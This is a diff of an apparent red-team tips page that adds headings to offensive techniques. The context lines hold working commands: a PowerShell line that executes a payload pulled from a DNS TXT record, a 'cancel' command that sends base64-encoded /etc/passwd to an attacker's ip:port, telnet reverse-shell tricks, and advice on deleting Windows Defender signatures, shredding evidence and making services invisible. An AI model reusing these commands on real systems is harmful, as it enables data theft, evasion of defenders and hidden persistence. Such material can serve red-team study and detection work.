@@ -7,7 +7,8 @@ categories: redteam R&D
 
 # Windows
 
-## Attacker can put malicious payload in DNS TXT record content of domain. So, watch out for:
+## Malicious Payload in DNS Txt
+Attacker can put malicious payload in DNS TXT record content of domain. So, watch out for:
 
 ```bash
 powershell . (nslookup -q=txt some.domain.com)[-1]
@@ -15,7 +16,7 @@ powershell . (nslookup -q=txt some.domain.com)[-1]
 
 
 ---
-
+## Curl with cancel
 Except curl, wget and nc commands, attacker can use ‘cancel’ to exfiltrate data 
 
 ```bash
@@ -30,6 +31,7 @@ cancel -u "$(cat /etc/passwd | base64)" -h <ip>:<port>
 
 ---
 
+## RCE without python Bash 
 After successful RCE inside container, but the container doesn't have BASH, Netcat, Python, or any of your normal revshell helpers, attacker can also use telnet
 
 ```bash
@@ -49,6 +51,7 @@ explorer.exe /root,"C:\Windows\System32\calc.exe"
 
 ---
 
+## Windows Defender signature removoal  
 A bit messy, but if Windows Defender is causing you a big headache, rather than disabling it (which alerts the user), you should just neuter it by deleting all the signatures:
 
 ```powershell
@@ -64,7 +67,7 @@ Red Teamers: those pesky security vendors--like VirusTotal, PaloAlto, and Fortin
 ---
 
 ---
-
+## Delete file with shred
 Just deleting files is not enough. To really remove them, use shred.
 
 ```bash
@@ -80,7 +83,7 @@ FN=cthulhu.txt; dd bs=1k count="du -sk \\"${FN}\\" | cut -f1" if=/dev/urandom >"
 ---
 
 ---
-
+## Hiding Windows services
 This is a really nasty tip: Windows' sc.exe allows you to manually assign service permissions with SDDL syntax. This allows you to essentially make your service invisible unless defenders already know the service name.
 
 Services.exe, Get-Service, sc.exe, all of these fail.
